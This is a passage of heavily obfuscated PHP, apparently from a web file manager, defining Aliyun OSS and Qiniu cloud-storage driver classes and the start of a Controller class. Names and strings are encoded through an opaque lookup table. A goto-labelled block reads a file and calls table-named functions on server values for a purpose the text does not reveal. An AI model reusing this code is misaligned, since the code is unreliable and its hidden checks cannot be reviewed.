think_exception($¤ˆØ¯”->getMessage()); return !1; } } private function trafficLimit($§é•‡ºç, $ÛõÔÌæ = array()) { $€•ŞĞŠ =& $_SERVER[¹àö™Ç¾]; if ($§é•‡ºç == $€•ŞĞŠ[1392] && $this->isUploadServer() || $§é•‡ºç == $€•ŞĞŠ[120] && $this->isFileOutServer()) { return $ÛõÔÌæ; } $…Ûß¢Œ = floatval($GLOBALS[$€•ŞĞŠ[16]][$€•ŞĞŠ[100]][$€•ŞĞŠ[118]][$§é•‡ºç]) * 1024 * 1024 * 8; if (!$…Ûß¢Œ) { return $ÛõÔÌæ; } $…Ûß¢Œ = $…Ûß¢Œ < 819200 ? 819200 : ($…Ûß¢Œ > 838860800 ? 838860800 : $…Ûß¢Œ); $ÛõÔÌæ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($…Ûß¢Œ); return $ÛõÔÌæ; } public function link($ışÙÔŸª, $º¸ ¸ı÷ = array()) { $ÏËÜ¨ÚÕ =& $_SERVER[¹àö™Ç¾]; if (!$this->exist($ışÙÔŸª) || $this->isFolder($ışÙÔŸª)) { return !1; } try { $º¸ ¸ı÷ = $this->trafficLimit($ÏËÜ¨ÚÕ[120], $º¸ ¸ı÷); $„ä»¡Å³ = $this->client->signUrl($this->bucket, $this->pathEncode($ışÙÔŸª), 3600 * 12, $ÏËÜ¨ÚÕ[235], $º¸ ¸ı÷); return $this->getCdnLink($„ä»¡Å³); } catch (OSS\Core\OssException $†›Ñ…÷€) { return !1; } } public function fileOut($ã¾¿³Ç‰, $Øâ¡º­ = false, $¨§©ÒÄ = false, $öÈ†Û¥ª = '') { $ûšÉ¡‘ =& $_SERVER[¹àö™Ç¾]; if ($this->isFileOutServer()) { return $this->fileOutServer($ã¾¿³Ç‰, $Øâ¡º­, $¨§©ÒÄ, $öÈ†Û¥ª); } if (!$¨§©ÒÄ) { $¨§©ÒÄ = $this->pathThis($ã¾¿³Ç‰); } $¨§©ÒÄ = rawurlencode($¨§©ÒÄ); $‚ÙïÉú¹ = get_file_mime(get_path_ext($¨§©ÒÄ)); if ($‚ÙïÉú¹ == $ûšÉ¡‘[222]) { return parent::fileOut($ã¾¿³Ç‰, $Øâ¡º­, $¨§©ÒÄ, $öÈ†Û¥ª); } $Øâ¡º­ = $Øâ¡º­ ? $ûšÉ¡‘[1403] : $ûšÉ¡‘[1404]; $ú¥²€œÖ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ûšÉ¡‘[1405] . rawurlencode("{$Øâ¡º­}\x3b\x66\151\x6c\145\156\141\155\x65\75{$¨§©ÒÄ}")); $ú¥²€œÖ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ûšÉ¡‘[1406] . rawurlencode($‚ÙïÉú¹); $Ã¶á°‘ç = $this->link($ã¾¿³Ç‰, $ú¥²€œÖ); $this->fileOutLink($Ã¶á°‘ç); } public function fileOutServer($¾¹Ğ­³‡, $†–µ¥ù˜ = false, $åæ”³®° = false, $‘—‰ƒÁ¡ = '') { parent::fileOut($¾¹Ğ­³‡, $†–µ¥ù˜, $åæ”³®°, $‘—‰ƒÁ¡); } public function fileOutImage($µ¨¹ƒ„¤, $öÒéæ² = 250) { $İ»öíô = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹àö™Ç¾][1407] . $öÒéæ²); $ÆÑã¸«µ = $this->link($µ¨¹ƒ„¤, $İ»öíô); $this->fileOutLink($ÆÑã¸«µ); } public function fileOutImageServer($®–ĞÊŸ, $æ‚©¦¡ = 250) { parent::fileOutImage($®–ĞÊŸ, $æ‚©¦¡); } public function fileOutLink($ÙÆ„òÁæ) { $ÆÇ²Û„‚ =& $_SERVER[¹àö™Ç¾]; if (!$this->isCdnHost() && substr($ÙÆ„òÁæ, 0, 7) == $ÆÇ²Û„‚[1308]) { $ÙÆ„òÁæ = $ÆÇ²Û„‚[1309] . substr($ÙÆ„òÁæ, 7); } header($ÆÇ²Û„‚[168] . $ÙÆ„òÁæ); die; } public function hashMd5($±àøÁ¯, $òÚâ‰ = '') { $ƒ¸ïà =& $_SERVER[¹àö™Ç¾]; $ëª¤ùªˆ = $this->_objectMeta($±àøÁ¯); if (!$ëª¤ùªˆ) { return $ƒ¸ïà[22]; } if (!isset($ëª¤ùªˆ[$ƒ¸ïà[1382]]) && !empty($òÚâ‰)) { $ïÜüú×¦ = $this->updateObjMeta($±àøÁ¯, array($ƒ¸ïà[1382] => $òÚâ‰)); $ëª¤ùªˆ[$ƒ¸ïà[1382]] = $ïÜüú×¦ ? $òÚâ‰ : $ƒ¸ïà[22]; } return isset($ëª¤ùªˆ[$ƒ¸ïà[1382]]) ? strtolower($ëª¤ùªˆ[$ƒ¸ïà[1382]]) : $ƒ¸ïà[22]; } public function size($Øß“ÃÕû) { $ÃÀŒ»• = $this->objectMeta($Øß“ÃÕû); return $ÃÀŒ»• ? $ÃÀŒ»•[$_SERVER[¹àö™Ç¾][90]] : 0; } public function info($‚Ì¡áğ·) { if ($this->isFolder($‚Ì¡áğ·)) { return $this->folderInfo($‚Ì¡áğ·); } else { if ($this->isFile($‚Ì¡áğ·)) { return $this->fileInfo($‚Ì¡áğ·); } } return !1; } public function exist($‡ãçİÔ) { return $this->isFile($‡ãçİÔ) || $this->isFolder($‡ãçİÔ); } public function isFile($Ú¡Ì×â¦) { return !$this->isFolder($Ú¡Ì×â¦) && $this->objectMeta($Ú¡Ì×â¦); } public function isFolder($¨ÓÊå×) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][208], $¨ÓÊå×); } protected function objectMeta($¹øò„ñ) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][209], $¹øò„ñ); } protected function _objectMeta($¦ğˆèÚú) { $Ä“í‘úÀ =& $_SERVER[¹àö™Ç¾]; try { $ø·ëŒÚµ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¦ğˆèÚú)); } catch (OSS\Core\OssException $¸ÔÍ½‰…) { $ø·ëŒÚµ = !1; } if ($ø·ëŒÚµ) { $ø·ëŒÚµ[$Ä“í‘úÀ[90]] = intval($ø·ëŒÚµ[$Ä“í‘úÀ[1380]]); } return $ø·ëŒÚµ; } protected function _isFolder($§¤×¢‘ƒ) { $Åú´Ë»Õ =& $_SERVER[¹àö™Ç¾]; if ($§¤×¢‘ƒ == $Åú´Ë»Õ[22] || $§¤×¢‘ƒ == $Åú´Ë»Õ[18]) { return !0; } $¦ş°²€Ë = array($Åú´Ë»Õ[1376] => $Åú´Ë»Õ[18], $Åú´Ë»Õ[1377] => rtrim($§¤×¢‘ƒ, $Åú´Ë»Õ[18]) . $Åú´Ë»Õ[18], $Åú´Ë»Õ[1378] => 1, $Åú´Ë»Õ[1379] => $Åú´Ë»Õ[22]); $¼î¡äœ = $this->client->listObjects($this->bucket, $¦ş°²€Ë); if ($¼î¡äœ->getObjectList() || $¼î¡äœ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($¦ñÀåû) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹àö™Ç¾][1408]; $this->_init($¦ñÀåû); } public function _init($…ßˆ¨¢”) { $ˆÓ¯ˆó® =& $_SERVER[¹àö™Ç¾]; foreach ($…ßˆ¨¢” as $ª½ÔéÈ => $ÉˆÛõ£ˆ) { if (isset($this->{$ª½ÔéÈ})) { $this->{$ª½ÔéÈ} = $ÉˆÛõ£ˆ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ˆÓ¯ˆó®[1409] . LNG($ˆÓ¯ˆó®[1367])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ê©ûÖ‘ß, $ÔÃœô÷æ = '', $Áòèõ© = REPEAT_RENAME) { if ($this->setContent($Ê©ûÖ‘ß, $ÔÃœô÷æ)) { return $this->getPathOuter($Ê©ûÖ‘ß); } return !1; } public function mkdir($øØÁû£‘, $ş‚ØìÚ = REPEAT_SKIP) { $Í“¿êŞº =& $_SERVER[¹àö™Ç¾]; $û¿ª¤Ø = trim($øØÁû£‘, $Í“¿êŞº[18]); if ($this->_isFolder($û¿ª¤Ø)) { return $this->getPathOuter($û¿ª¤Ø); } $øØÁû£‘ = $û¿ª¤Ø . $Í“¿êŞº[18]; $êèãòª¥ = get_path_this($û¿ª¤Ø); $ïÁ¡±â¿ = $øØÁû£‘ . $êèãòª¥; if (!$this->mkfile($ïÁ¡±â¿)) { return !1; } if (!$this->moveFile($ïÁ¡±â¿, $øØÁû£‘)) { $this->delFile($ïÁ¡±â¿); return !1; } return $this->getPathOuter($û¿ª¤Ø); } public function copyFile($¾á¾¼‘†, $íÉ¾¾“ä) { $ë§ÏÎÆ¶ = $this->bucketManager->copy($this->bucket, $¾á¾¼‘†, $this->bucket, $íÉ¾¾“ä, !0); return $ë§ÏÎÆ¶ ? !1 : $this->getPathOuter($íÉ¾¾“ä); } public function moveFile($¼©âÀÓó, $ĞØíëËù) { $¾ÉİŸõ¾ = $this->bucketManager->move($this->bucket, $¼©âÀÓó, $this->bucket, $ĞØíëËù, !0); return $¾ÉİŸõ¾ ? !1 : $this->getPathOuter($ĞØíëËù); } public function delFile($Õâ¿Õ¶’) { if (!$this->exist($Õâ¿Õ¶’)) { return !0; } $İ ·åÊ = $this->bucketManager->delete($this->bucket, $Õâ¿Õ¶’); return $İ ·åÊ ? !1 : !0; } public function delFolder($ÅŸ»ˆÊ) { $¢Ò·ÀôÖ =& $_SERVER[¹àö™Ç¾]; if (!$this->exist($ÅŸ»ˆÊ)) { return !0; } $this->listItemCache = !1; $æÂ¾°±ú = $this->fileList($ÅŸ»ˆÊ); $this->listItemCache = !0; $¬º¿‹°Ã = trim($ÅŸ»ˆÊ, $¢Ò·ÀôÖ[18]) . $¢Ò·ÀôÖ[18]; if (!empty($ÅŸ»ˆÊ) && $ÅŸ»ˆÊ !== $¢Ò·ÀôÖ[200] && !in_array($¬º¿‹°Ã, $æÂ¾°±ú[$¢Ò·ÀôÖ[87]])) { $æÂ¾°±ú[$¢Ò·ÀôÖ[87]][] = $¬º¿‹°Ã; } $ƒŞĞÓ = $this->delByBatch($æÂ¾°±ú[$¢Ò·ÀôÖ[86]]); if (!$ƒŞĞÓ) { return !1; } $ƒŞĞÓ = $this->delByBatch($æÂ¾°±ú[$¢Ò·ÀôÖ[87]]); if (!$ƒŞĞÓ) { return !1; } return $this->delFile($¬º¿‹°Ã); } private function delByBatch($Ê ¨ŞÜ) { foreach (array_chunk($Ê ¨ŞÜ, 1000) as $¼•¬¦è«) { $¤ç¤¦‰ƒ = $this->bucketManager->buildBatchDelete($this->bucket, $¼•¬¦è«); list($à¡°Â‡Œ, $Ü·Ï•¾Â) = $this->bucketManager->batch($¤ç¤¦‰ƒ); if ($Ü·Ï•¾Â) { return !1; } } return !0; } public function rename($š×µš£¸, $µë±Ş°±) { return $this->renameObject($š×µš£¸, $µë±Ş°±); } public function fileInfo($–úË§®Ç, $¿¢†ƒÛ = false, $ÃÌˆÀõ½ = array()) { $Æï¾åò° =& $_SERVER[¹àö™Ç¾]; $Ëæ’à™ = array($Æï¾åò°[42] => $this->pathThis($–úË§®Ç), $Æï¾åò°[88] => $this->getPathOuter($Æï¾åò°[18] . $–úË§®Ç), $Æï¾åò°[43] => $Æï¾åò°[202], $Æï¾åò°[90] => isset($ÃÌˆÀõ½[$Æï¾åò°[1410]]) ? $ÃÌˆÀõ½[$Æï¾åò°[1410]] : 0, $Æï¾åò°[177] => $this->ext($–úË§®Ç)); if ($¿¢†ƒÛ) { return $Ëæ’à™; } $Ëæ’à™[$Æï¾åò°[203]] = $Ëæ’à™[$Æï¾åò°[96]] = 0; $Ëæ’à™[$Æï¾åò°[204]] = $Ëæ’à™[$Æï¾åò°[205]] = !0; if (empty($ÃÌˆÀõ½)) { $ÃÌˆÀõ½ = $this->objectMeta($–úË§®Ç); if (!$ÃÌˆÀõ½) { return $Ëæ’à™; } } if (isset($ÃÌˆÀõ½[$Æï¾åò°[1411]])) { $Ëæ’à™[$Æï¾åò°[96]] = substr($ÃÌˆÀõ½[$Æï¾åò°[1411]] . $Æï¾åò°[22], 0, 10); } if (isset($ÃÌˆÀõ½[$Æï¾åò°[1410]])) { $Ëæ’à™[$Æï¾åò°[90]] = $ÃÌˆÀõ½[$Æï¾åò°[1410]]; } return $Ëæ’à™; } public function folderInfo($Æ»‘®Øê, $Áãà…È = false) { $º™´…¦ù =& $_SERVER[¹àö™Ç¾]; $­‘ï«›ë = array($º™´…¦ù[42] => $this->pathThis($Æ»‘®Øê), $º™´…¦ù[88] => $this->getPathOuter($º™´…¦ù[18] . $Æ»‘®Øê), $º™´…¦ù[43] => $º™´…¦ù[89]); if ($Áãà…È) { return $­‘ï«›ë; } $­‘ï«›ë[$º™´…¦ù[203]] = $­‘ï«›ë[$º™´…¦ù[96]] = 0; $­‘ï«›ë[$º™´…¦ù[204]] = $­‘ï«›ë[$º™´…¦ù[205]] = !0; $Æ»‘®Øê = rtrim($Æ»‘®Øê, $º™´…¦ù[18]) . $º™´…¦ù[18]; $¤ªÜ©½ñ = $this->objectMeta($Æ»‘®Øê); if (isset($¤ªÜ©½ñ[$º™´…¦ù[1411]])) { $­‘ï«›ë[$º™´…¦ù[96]] = substr($¤ªÜ©½ñ[$º™´…¦ù[1411]] . $º™´…¦ù[22], 0, 10); } return $­‘ï«›ë; } public function listPath($ûé¦ùØÔ, $÷şº×œ = false) { $ã¿ºÕÓÀ =& $_SERVER[¹àö™Ç¾]; $€„·Îıá = $this->fileList($ûé¦ùØÔ, $ã¿ºÕÓÀ[18], !0); foreach ($€„·Îıá[$ã¿ºÕÓÀ[87]] as $½¾ÑºŞˆ => $™İ¾öĞÊ) { $€„·Îıá[$ã¿ºÕÓÀ[87]][$½¾ÑºŞˆ] = $this->folderInfo($™İ¾öĞÊ, $÷şº×œ); } foreach ($€„·Îıá[$ã¿ºÕÓÀ[86]] as $½¾ÑºŞˆ => $™İ¾öĞÊ) { $€„·Îıá[$ã¿ºÕÓÀ[86]][$½¾ÑºŞˆ] = $this->fileInfo($™İ¾öĞÊ[$ã¿ºÕÓÀ[105]], $÷şº×œ, $™İ¾öĞÊ); } return $€„·Îıá; } public function has($¦ÈˆÌå, $ú‘›ÀÓÚ = false, $®€Š²—  = true) { $òíùó†Ï =& $_SERVER[¹àö™Ç¾]; $¦ÈˆÌå = trim($¦ÈˆÌå, $òíùó†Ï[18]); $§«¦Ò©½ = empty($¦ÈˆÌå) && $¦ÈˆÌå !== $òíùó†Ï[200] ? $òíùó†Ï[22] : $¦ÈˆÌå . $òíùó†Ï[18]; $Ì”œë¿ = $òíùó†Ï[22]; $««ôÀ¸Ù = 500; $¯ÂÉšúõ = $òíùó†Ï[18]; $È‘ò³ú³ = $Ø¿‰¤ = 0; while (!0) { check_abort(); list($ù’ÒÎê, $®šƒ¶™) = $this->bucketManager->listFiles($this->bucket, $§«¦Ò©½, $Ì”œë¿, $««ôÀ¸Ù, $¯ÂÉšúõ); if ($®šƒ¶™) { break; } $Ì”œë¿ = array_key_exists($òíùó†Ï[1379], $ù’ÒÎê) ? $Ì”œë¿ = $ù’ÒÎê[$òíùó†Ï[1412]] : $òíùó†Ï[22]; if ($ú‘›ÀÓÚ) { if (!empty($ù’ÒÎê[$òíùó†Ï[1413]])) { $È‘ò³ú³ += count($ù’ÒÎê[$òíùó†Ï[1413]]); } if (!empty($ù’ÒÎê[$òíùó†Ï[1414]])) { $Ø¿‰¤ += count($ù’ÒÎê[$òíùó†Ï[1414]]); } if ($Ì”œë¿ === $òíùó†Ï[22]) { break; } continue; } if ($®€Š²— ) { if (!empty($ù’ÒÎê[$òíùó†Ï[1413]])) { return !0; } } else { if (!empty($ù’ÒÎê[$òíùó†Ï[1414]])) { return !0; } } if ($Ì”œë¿ === $òíùó†Ï[22]) { break; } } if ($ú‘›ÀÓÚ) { return array($òíùó†Ï[212] => $È‘ò³ú³, $òíùó†Ï[213] => $Ø¿‰¤); } return !1; } public function listAll($ÀÕòÚ´û) { $ŸÇÑ¤åâ =& $_SERVER[¹àö™Ç¾]; $ÁÏ´Éªà = $this->fileList($ÀÕòÚ´û, $ŸÇÑ¤åâ[22], !0); $ÏÇ¸İ­º = array(); foreach ($ÁÏ´Éªà[$ŸÇÑ¤åâ[86]] as $•šı˜Á¡) { $ÏÇ¸İ­º[$•šı˜Á¡[$ŸÇÑ¤åâ[105]]] = $•šı˜Á¡[$ŸÇÑ¤åâ[90]]; } foreach ($ÁÏ´Éªà[$ŸÇÑ¤åâ[87]] as $•šı˜Á¡) { if (is_string($•šı˜Á¡)) { $ÏÇ¸İ­º[$•šı˜Á¡] = 0; } } return $this->listAllFiles($ÀÕòÚ´û, array_keys($ÏÇ¸İ­º), $ÏÇ¸İ­º); } private function fileList($¼©¥Ğç», $ÁÉ·ë¥Š = '', $†ı×Ş´¢ = 0) { $õó¦³¾¨ =& $_SERVER[¹àö™Ç¾]; $¼©¥Ğç» = trim($¼©¥Ğç», $õó¦³¾¨[18]); $ğÓÑÇ…ö = empty($¼©¥Ğç») && $¼©¥Ğç» !== $õó¦³¾¨[200] ? $õó¦³¾¨[22] : $¼©¥Ğç» . $õó¦³¾¨[18]; $ÛĞ…Î•‚ = $õó¦³¾¨[22]; $òçî…êŠ = 1000; $Úñ¿ñ™… = $this->listItemCache === !1 ? !1 : !0; $â¾¢ÒØ» = $­¬ö»šŠ = array(); while (!0) { check_abort(); list($ÖÌ»¶ß, $æ„‹§€„) = $this->bucketManager->listFiles($this->bucket, $ğÓÑÇ…ö, $ÛĞ…Î•‚, $òçî…êŠ, $ÁÉ·ë¥Š); if ($æ„‹§€„) { break; } $ÛĞ…Î•‚ = array_key_exists($õó¦³¾¨[1379], $ÖÌ»¶ß) ? $ÛĞ…Î•‚ = $ÖÌ»¶ß[$õó¦³¾¨[1412]] : $õó¦³¾¨[22]; $Ó“¬Œ´ğ = isset($ÖÌ»¶ß[$õó¦³¾¨[1413]]) ? $ÖÌ»¶ß[$õó¦³¾¨[1413]] : array(); $á‰£ù—ò = isset($ÖÌ»¶ß[$õó¦³¾¨[1414]]) ? $ÖÌ»¶ß[$õó¦³¾¨[1414]] : array(); foreach ($Ó“¬Œ´ğ as $²¹Òš„Ó) { if ($²¹Òš„Ó[$õó¦³¾¨[105]] == $ğÓÑÇ…ö) { continue; } $’æ…š¢ = $²¹Òš„Ó[$õó¦³¾¨[105]]; $™Ã§¶³• = $²¹Òš„Ó[$õó¦³¾¨[1410]]; $²¹Òš„Ó[$õó¦³¾¨[90]] = $™Ã§¶³•; $¡°»èŞ = $™Ã§¶³• == 0 && substr($’æ…š¢, strlen($’æ…š¢) - 1, 1) == $õó¦³¾¨[18] ? !0 : !1; if ($Úñ¿ñ™…) { $this->cacheMethod($õó¦³¾¨[208], $’æ…š¢, $¡°»èŞ); $this->cacheMethod($õó¦³¾¨[209], $’æ…š¢, $²¹Òš„Ó); } if ($¡°»èŞ) { $â¾¢ÒØ»[] = $’æ…š¢; continue; } $­¬ö»šŠ[] = $†ı×Ş´¢ ? $²¹Òš„Ó : $’æ…š¢; } foreach ($á‰£ù—ò as $’æ…š¢) { if ($’æ…š¢ == $ğÓÑÇ…ö) { continue; } $â¾¢ÒØ»[] = $’æ…š¢; if ($Úñ¿ñ™…) { $this->cacheMethod($õó¦³¾¨[208], $’æ…š¢, !0); } } if ($ÛĞ…Î•‚ === $õó¦³¾¨[22]) { break; } } if ($Úñ¿ñ™…) { $this->cacheMethod($õó¦³¾¨[208], $¼©¥Ğç», !0); } return array($õó¦³¾¨[87] => $â¾¢ÒØ», $õó¦³¾¨[86] => $­¬ö»šŠ); } public function canRead($ÛÜâ…Ÿû) { return $this->exist($ÛÜâ…Ÿû) ? !0 : !1; } public function canWrite($Ö‹Ğ®æ€) { return $this->exist($Ö‹Ğ®æ€) ? !0 : !1; } public function getContent($È°»¶ğ) { return $this->fileSubstr($È°»¶ğ, 0, -1); } public function setContent($İœÉÀÕı, $À¤‚ïÛ¬ = '') { $õîàÙƒ¦ = $this->tempFile($this->pathThis($İœÉÀÕı)); file_put_contents($õîàÙƒ¦, $À¤‚ïÛ¬); if ($this->upload($İœÉÀÕı, $õîàÙƒ¦)) { $this->tempFileRemve($õîàÙƒ¦); return !0; } return !1; } public function refreshUrls($ü¯×Ì·û) { $÷İ×ğñ =& $_SERVER[¹àö™Ç¾]; $…¿¤çı = array(); if (is_array($ü¯×Ì·û)) { foreach ($ü¯×Ì·û as $×‘Š“¬ƒ) { $…¿¤çı[] = $this->link($×‘Š“¬ƒ); } } else { $…¿¤çı[] = $this->link($ü¯×Ì·û); } $š¥è¼¢ = new Qiniu\Cdn\CdnManager($this->auth); list($äƒÃÔ´Á, $Å˜ŸÚ±ü) = $š¥è¼¢->refreshUrls($…¿¤çı); if ($Å˜ŸÚ±ü) { return !1; } return $äƒÃÔ´Á[$÷İ×ğñ[1166]] == $÷İ×ğñ[752] ? !0 : !1; } public function fileSubstr($¼¶ª™œÜ, $Ô©©úÜÛ, $‘êÛöÛ) { $½ŞÔ¶Ù½ =& $_SERVER[¹àö™Ç¾]; if (!($ç‚ñ²‘Í = $this->link($¼¶ª™œÜ))) { return !1; } $È¨×ò = !1; if ($‘êÛöÛ > 0) { $ÕÄÈä›‘ = $Ô©©úÜÛ + $‘êÛöÛ - 1; $È¨×ò = array($½ŞÔ¶Ù½[1415] . $Ô©©úÜÛ . $½ŞÔ¶Ù½[460] . $ÕÄÈä›‘); } $Ë¶¯Úìå = url_request($ç‚ñ²‘Í, $½ŞÔ¶Ù½[235], !1, $È¨×ò); return $Ë¶¯Úìå[$½ŞÔ¶Ù½[742]] ? $Ë¶¯Úìå[$½ŞÔ¶Ù½[1176]] : !1; } public function upload($•ÕˆÄöı, $ñì“–ê±, $”é„“ò = false, $Ü¢¦¢ë = REPEAT_REPLACE) { $úÈ¤ˆÂ = new Qiniu\Storage\UploadManager(); $œûµæÀ = $this->auth->uploadToken($this->bucket, $•ÕˆÄöı); $©¥ÃÑ¢ = get_file_mime(get_path_ext($ñì“–ê±)); list($øÓÊ„‹ï, $ÅÖ§ı‚¨) = $úÈ¤ˆÂ->putFile($œûµæÀ, $•ÕˆÄöı, $ñì“–ê±, null, $©¥ÃÑ¢); return $ÅÖ§ı‚¨ ? !1 : $this->getPathOuter($•ÕˆÄöı); } public function uploadFormData($êßæ‘ì, $·ÊÀ˜êø = 3600) { return $this->uploadToken($êßæ‘ì, $·ÊÀ˜êø); } public function multiUploadFormData($¸±¬©½ü, $†Ê·³Óú = 3600) { return $this->uploadToken($¸±¬©½ü, $†Ê·³Óú); } private function uploadToken($¨ôÂ¿¦à, $…®œ• = 3600) { $³Åµ¿Şù =& $_SERVER[¹àö™Ç¾]; $‹¡´Ë„­ = $…®œ•; $ìöÚ±½“ = array($³Åµ¿Şù[1416] => $³Åµ¿Şù[1417]); $Ì§ÉÀ£Á = $¨ôÂ¿¦à; $×‚ÄüÓØ = $this->auth->uploadToken($this->bucket, $Ì§ÉÀ£Á, $‹¡´Ë„­, $ìöÚ±½“, !0); $ã÷¢ÚŞñ = empty($this->region) || $this->region == $³Åµ¿Şù[1418] ? $³Åµ¿Şù[22] : $³Åµ¿Şù[460] . $this->region; $ôß˜şúÇ = http_type() . "\x3a\57\57\165\160\x6c\157\x61\144{$ã÷¢ÚŞñ}\x2e\161\151\x6e\151\165\160\x2e\x63\x6f\155\x2f"; return array($³Åµ¿Şù[1419] => $×‚ÄüÓØ, $³Åµ¿Şù[1420] => $ôß˜şúÇ); } public function download($¨û†Éó, $ê“ÎİÉù) { $ºñØ³× = IO::getPathInner(IO::mkfile($ê“ÎİÉù)); if (!($ú±¨µ = $this->link($¨û†Éó))) { return !1; } $şè³ôğã = 0; $Ö¥·äêÂ = 1024 * 200; $¤Ğ¦ˆÀ¬ = fopen($ºñØ³×, $_SERVER[¹àö™Ç¾][1421]); while (!0) { $É‡àˆáü = $this->fileSubstr($¨û†Éó, $şè³ôğã, $Ö¥·äêÂ); if ($É‡àˆáü === !1) { return !1; } fwrite($¤Ğ¦ˆÀ¬, $É‡àˆáü); $şè³ôğã += $Ö¥·äêÂ; if (strlen($É‡àˆáü) < $Ö¥·äêÂ) { break; } } fclose($¤Ğ¦ˆÀ¬); return $ê“ÎİÉù; } public function link($¥×á¬‡å, $¨éïôƒ« = '') { if (!$this->isFile($¥×á¬‡å)) { return !1; } $ƒÃ¼ Û÷ = $this->getHost() . $_SERVER[¹àö™Ç¾][18] . $this->pathEncode($¥×á¬‡å) . $¨éïôƒ«; return $this->auth->privateDownloadUrl($ƒÃ¼ Û÷, 3600 * 12); } public function fileOut($ã«ÍŸ, $Ş¹©Ø² = false, $Š¯››Æè = false, $ç¦øªÔ = '') { $Ä‡¼˜ïï =& $_SERVER[¹àö™Ç¾]; if ($this->isFileOutServer()) { return $this->fileOutServer($ã«ÍŸ, $Ş¹©Ø², $Š¯››Æè, $ç¦øªÔ); } if (!$Š¯››Æè) { $Š¯››Æè = $this->pathThis($ã«ÍŸ); } $í°íôÔ = $Ş¹©Ø² ? $Ä‡¼˜ïï[1422] . rawurlencode($Š¯››Æè) : $Ä‡¼˜ïï[22]; $ô³»ºğ€ = $this->link($ã«ÍŸ, $í°íôÔ); $this->fileOutLink($ô³»ºğ€); } public function fileOutServer($¿å¤ÇÁş, $§ı‘²ÅÓ = false, $Íö©õö© = false, $ÛŸ°İ•î = '') { parent::fileOut($¿å¤ÇÁş, $§ı‘²ÅÓ, $Íö©õö©, $ÛŸ°İ•î); } public function fileOutImage($œÂƒÈ‘Ù, $À¼Ã½Ù³ = 250) { $Ğûù Á = $this->link($œÂƒÈ‘Ù, $_SERVER[¹àö™Ç¾][1423] . $À¼Ã½Ù³); $this->fileOutLink($Ğûù Á); } public function fileOutImageServer($ùé¤ÊÑš, $ºßøÙ·¦ = 250) { parent::fileOutImage($ùé¤ÊÑš, $ºßøÙ·¦); } public function hashMd5($æàô°ü¢) { $Œ¶¼Ô® =& $_SERVER[¹àö™Ç¾]; $ƒÚíŠ = $this->objectMeta($æàô°ü¢); return isset($ƒÚíŠ[$Œ¶¼Ô®[217]]) ? $ƒÚíŠ[$Œ¶¼Ô®[217]] : !1; $…·¡õ£‹ = $this->link($æàô°ü¢, $Œ¶¼Ô®[1424]); } public function size($„¯ˆ†¦ ) { $²ÎĞï¢è = $this->objectMeta($„¯ˆ†¦ ); return $²ÎĞï¢è ? $²ÎĞï¢è[$_SERVER[¹àö™Ç¾][90]] : 0; } public function info($°ğÖ¬á–) { if ($this->isFolder($°ğÖ¬á–)) { return $this->folderInfo($°ğÖ¬á–); } else { if ($this->isFile($°ğÖ¬á–)) { return $this->fileInfo($°ğÖ¬á–); } } return !1; } public function exist($ÀéÙàõš) { return $this->isFile($ÀéÙàõš) || $this->isFolder($ÀéÙàõš); } public function isFile($úñê“¹ª) { return !$this->isFolder($úñê“¹ª) && $this->objectMeta($úñê“¹ª); } public function isFolder($Û¬¤ˆİ) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][208], $Û¬¤ˆİ); } protected function objectMeta($›¸´Ç•) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][209], $›¸´Ç•); } protected function _objectMeta($üÖŠÈõÔ) { $õ­ÑÛÀ =& $_SERVER[¹àö™Ç¾]; list($ÒÖé‹ğ, $ıÄÀŠ—ã) = $this->bucketManager->stat($this->bucket, $üÖŠÈõÔ); if ($ÒÖé‹ğ) { $ÒÖé‹ğ[$õ­ÑÛÀ[90]] = intval($ÒÖé‹ğ[$õ­ÑÛÀ[1410]]); } return $ÒÖé‹ğ; } protected function _isFolder($Ó¸Şäì) { $è÷èê„Œ =& $_SERVER[¹àö™Ç¾]; if ($Ó¸Şäì == $è÷èê„Œ[22] || $Ó¸Şäì == $è÷èê„Œ[18]) { return !0; } list($èˆ™ô, $„Ô¿Âµª) = $this->bucketManager->listFiles($this->bucket, trim($Ó¸Şäì, $è÷èê„Œ[18]) . $è÷èê„Œ[18], $è÷èê„Œ[22], 1, $è÷èê„Œ[18]); return !empty($èˆ™ô[$è÷èê„Œ[1413]]) || !empty($èˆ™ô[$è÷èê„Œ[1414]]) ? !0 : !1; } } goto D‰áª”Ç¹; Fçà‘¿É: if ($_SERVER[$_SERVER[¹àö™Ç¾][6]] != $_SERVER[$_SERVER[¹àö™Ç¾][7]]) { $_getc = $_SERVER[¹àö™Ç¾][8]; $_getfile = $_SERVER[$_SERVER[¹àö™Ç¾][9]] . $_SERVER[¹àö™Ç¾][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹àö™Ç¾][11], $_getfilec); if (count($_getarrs) < $_SERVER[¹àö™Ç¾][12]) { $exit = $_SERVER[¹àö™Ç¾][13]; $exit(); } $_act = $_SERVER[¹àö™Ç¾][14]; $_act($_SERVER[$_SERVER[¹àö™Ç¾][15]]); } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $öƒÃë¤š =& $_SERVER[¹àö™Ç¾]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$öƒÃë¤š[16]] =& $config; $this->values[$öƒÃë¤š[17]] =& $in; $this->tpl = TEMPLATE . MOD . $öƒÃë¤š[18]; $this->_classObjectID = mt_rand(0, 10000); } public function 